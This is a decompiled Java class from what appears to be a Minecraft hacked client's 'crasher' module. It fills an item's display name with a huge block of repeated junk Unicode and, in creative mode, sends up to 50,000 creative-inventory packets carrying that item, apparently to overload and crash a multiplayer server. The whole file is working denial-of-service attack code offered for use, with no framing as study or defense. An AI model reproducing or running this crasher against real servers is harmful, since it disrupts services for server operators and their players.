// 
// Decompiled by Procyon v0.6.0
// 

package me.amkgre.bettercraft.client.mods.crasher;

import net.minecraft.network.Packet;
import net.minecraft.network.play.client.CPacketCreativeInventoryAction;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Item;
import net.minecraft.client.Minecraft;

public class CreativeItemControlCrasher
{
    static String nbt;
    
    static {
        CreativeItemControlCrasher.nbt = String.valueOf(new StringBuilder(" \u263c \u2259 \u2023 \u2587 \u20aa � � \u2551 \u2563 � \u2557 \u255d ? ? \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa � � \u2551 \u2563 � \u2557 \u255d ? ? \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa � � \u2551 \u2563 � \u2557 \u255d ? ? \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa � � \u2551 \u2563 � \u2557 \u255d ? ? \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa � � \u2551 \u2563 � \u2557 \u255d ? ? \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa � � \u2551 \u2563 � \u2557 \u255d ? ? \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa � � \u2551 \u2563 � \u2557 \u255d ? ? \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa � � \u2551 \u2563 � \u2557 \u255d ? ? \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa � � \u2551 \u2563 � \u2557 \u255d ? ? \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa � � \u2551 \u2563 � \u2557 \u255d ? ? \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa � � \u2551 \u2563 � \u2557 \u255d ? ? \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa � � \u2551 \u2563 � \u2557 \u255d ? ? \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa � � \u2551 \u2563 � \u2557 \u255d ? ? \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa � � \u2551 \u2563 � \u2557 \u255d ? ? \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa � � \u2551 \u2563 � \u2557 \u255d ? ? \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa � � \u2551 \u2563 � \u2557 \u255d ? ? \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa � � \u2551 \u2563 � \u2557 \u255d ? ? \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa � � \u2551 \u2563 � \u2557 \u255d ? ? \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa � � \u2551 \u2563 � \u2557 \u255d ? ? \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa � � \u2551 \u2563 � \u2557 \u255d ? ? \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa � � \u2551 \u2563 � \u2557 \u255d ? ? \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa � � \u2551 \u2563 � \u2557 \u255d ? ? \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa � � \u2551 \u2563 � \u2557 \u255d ? ? \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa � � \u2551 \u2563 � \u2557 \u255d ? ? \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa � � \u2551 \u2563 � \u2557 \u255d ? ? \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa � � \u2551 \u2563 � \u2557 \u255d ? ? \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa � � \u2551 \u2563 � \u2557 \u255d ? ? \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa � � \u2551 \u2563 � \u2557 \u255d ? ? \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa � � \u2551 \u2563 � \u2557 \u255d ? ? \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa � � \u2551 \u2563 � \u2557 \u255d ? ? \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa � � \u2551 \u2563 � \u2557 \u255d ? ? \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa � � \u2551 \u2563 � \u2557 \u255d ? ? \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa � � \u2551 \u2563 � \u2557 \u255d ? ? \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa � � \u2551 \u2563 � \u2557 \u255d ? ? \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa � � \u2551 \u2563 � \u2557 \u255d ? ? \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa � � \u2551 \u2563 � \u2557 \u255d ? ? \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa � � \u2551 \u2563 � \u2557 \u255d ? ? \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa � � \u2551 \u2563 � \u2557 \u255d ? ? \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa � � \u2551 \u2563 � \u2557 \u255d ? ? \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa � � \u2551 \u2563 � \u2557 \u255d ? ? \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa � � \u2551 \u2563 � \u2557 \u255d ? ? \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa � � \u2551 \u2563 � \u2557 \u255d ? ? \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa � � \u2551 \u2563 � \u2557 \u255d ? ? \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa � � \u2551 \u2563 � \u2557 \u255d ? ? \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa � � \u2551 \u2563 � \u2557 \u255d ? ? \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa � � \u2551 \u2563 � \u2557 \u255d ? ? \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa � � \u2551 \u2563 � \u2557 \u255d ? ? \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa � � \u2551 \u2563 � \u2557 \u255d ? ? \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa � � \u2551 \u2563 � \u2557 \u255d ? ? \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa � � \u2551 \u2563 � \u2557 \u255d ? ? \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa � � \u2551 \u2563 � \u2557 \u255d ? ? \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa � � \u2551 \u2563 � \u2557 \u255d ? ? \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa � � \u2551 \u2563 � \u2557 \u255d ? ? \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa � � \u2551 \u2563 � \u2557 \u255d ? ? \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa � � \u2551 \u2563 � \u2557 \u255d ? ? \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa � � \u2551 \u2563 � \u2557 \u255d ? ? \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa � � \u2551 \u2563 � \u2557 \u255d ? ? \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa � � \u2551 \u2563 � \u2557 \u255d ? ? \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa � � \u2551 \u2563 � \u2557 \u255d ? ? \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa � � \u2551 \u2563 � \u2557 \u255d ? ? \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa � � \u2551 \u2563 � \u2557 \u255d ? ? \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa � � \u2551 \u2563 � \u2557 \u255d ? ? \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa � � \u2551 \u2563 � \u2557 \u255d ? ? \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa � � \u2551 \u2563 � \u2557 \u255d ? ? \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa � � \u2551 \u2563 � \u2557 \u255d ? ? \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa � � \u2551 \u2563 � \u2557 \u255d ? ? \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa � � \u2551 \u2563 � \u2557 \u255d ? ? \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa � � \u2551 \u2563 � \u2557 \u255d ? ? \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa � � \u2551 \u2563 � \u2557 \u255d ? ? \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa � � \u2551 \u2563 � \u2557 \u255d ? ? \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa � � \u2551 \u2563 � \u2557 \u255d ? ? \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa � � \u2551 \u2563 � \u2557 \u255d ? ? \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa � � \u2551 \u2563 � \u2557 \u255d ? ? \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa � � \u2551 \u2563 � \u2557 \u255d ? ? \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa � � \u2551 \u2563 � \u2557 \u255d ? ? \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa � � \u2551 \u2563 � \u2557 \u255d ? ? \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa � � \u2551 \u2563 � \u2557 \u255d ? ? \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa � � \u2551 \u2563 � \u2557 \u255d ? ? \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa � � \u2551 \u2563 � \u2557 \u255d ? ? \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa � � \u2551 \u2563 � \u2557 \u255d ? ? \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa � � \u2551 \u2563 � \u2557 \u255d ? ? \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa � � \u2551 \u2563 � \u2557 \u255d ? ? \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa � � \u2551 \u2563 � \u2557 \u255d ? ? \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa � � \u2551 \u2563 � \u2557 \u255d ? ? \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa � � \u2551 \u2563 � \u2557 \u255d ? ? \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa � � \u2551 \u2563 � \u2557 \u255d ? ? \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa � � \u2551 \u2563 � \u2557 \u255d ? ? \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa � � \u2551 \u2563 � \u2557 \u255d ? ? \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa � � \u2551 \u2563 � \u2557 \u255d ? ? \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa � � \u2551 \u2563 � \u2557 \u255d ? ? \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3  \u263c \u2259 \u2023 \u2587 \u20aa � � \u2551 \u2563 � \u2557 \u255d ? ? \u2510 \u2514 \u2534 \u252c \u251c \u2500 \u253c \u00e3 \u00c3 "));
    }
    
    public static void start() {
        if (Minecraft.getMinecraft().player.capabilities.isCreativeMode) {
            for (int i2 = 0; i2 < 50000; ++i2) {
                if (Minecraft.getMinecraft().player == null) {
                    break;
                }
                final Item item = Item.getItemById(122);
                final ItemStack itemStack = new ItemStack(item, 1);
                itemStack.setStackDisplayName(CreativeItemControlCrasher.nbt);
                Minecraft.getMinecraft().player.connection.sendPacket(new CPacketCreativeInventoryAction(36, itemStack));
            }
        }
    }
}